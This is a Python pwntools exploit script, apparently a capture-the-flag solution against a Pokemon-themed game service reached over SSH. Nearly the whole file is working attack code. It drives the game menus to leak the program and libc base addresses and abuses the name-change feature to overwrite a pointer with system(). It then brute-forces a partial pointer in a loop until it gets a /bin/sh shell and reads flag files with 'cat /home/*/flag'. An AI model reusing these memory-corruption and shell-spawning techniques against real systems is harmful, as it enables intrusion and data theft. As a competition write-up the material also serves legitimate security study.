#!/usr/bin/python3

from pwn import *

hostname = "quiz.ais3.org"
port = 5006
user = 'pokemon'

while True:
    try:
        r = process(f'ssh -p{port} {user}@{hostname}', shell=True, stdin=PTY)

        r.sendline('d') # name
        sleep(1)
        r.sendline('')
        r.send('ddssss')

        r.sendline('1')
        r.sendline('2')
        r.sendline('1')
        r.sendline('')

        r.send('dddddwww')
        r.sendline('1')
        r.sendline('2')
        r.sendline('1')
        r.sendlineafter('Which pokemon you want to choose', '+')

        r.recvuntil('Pocket id: ')
        code_base = r.recvuntil(',')
        code_base = int(code_base[:-1]) - 0x6230
        stdin = code_base + 0x10150

        info(f"""
        code base: {hex(code_base)}
        stdin : {hex(stdin)}
        """)

        r.sendline('n')
        r.sendline('4') # go away
        r.sendline('c') # change name
        r.sendline(p64(stdin).replace(b'\x00', b''))
        r.sendline('')
        r.send('d')

        r.sendline('1')
        sleep(1)
        r.sendline('2') # backpack
        r.sendline('7')
        r.recvuntil('Unknown prop ')
        libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1eb980
        _system = libc + 0x55410

        info(f"""
        libc: {hex(libc)}
        """)

        # change name
        r.sendline('4')
        r.sendline('c')
        r.sendline(p64(_system).replace(b'\x00', b''))
        r.sendline('')

        r.send('d')

        r.sendline('1')
        sleep(1)
        r.sendline('2')
        r.sendline('2')
        r.sendline('1')
        r.sendline('y') # recover hp

        r.sendline('2')
        r.sendline('1') # change name
        r.sendline('1') # id
        r.sendline('y')
        r.sendline('/bin/sh')

        #partial = 0xX2a0
        partial = 0x82a0 # 16 times
        r.sendline('1')
        r.sendline('y') # verbose
        r.sendline('1') # first skill
        r.sendlineafter('Expected damage: ', str(partial << 32))
        r.recvuntil('Use ')
        r.recvline()
        r.sendline('cat /home/*/flag')
        print(r.recvline(timeout=1))
        print(r.recvline(timeout=1))
        r.interactive()
        r.close()
    except:
        print("FAILED")
        r.close()
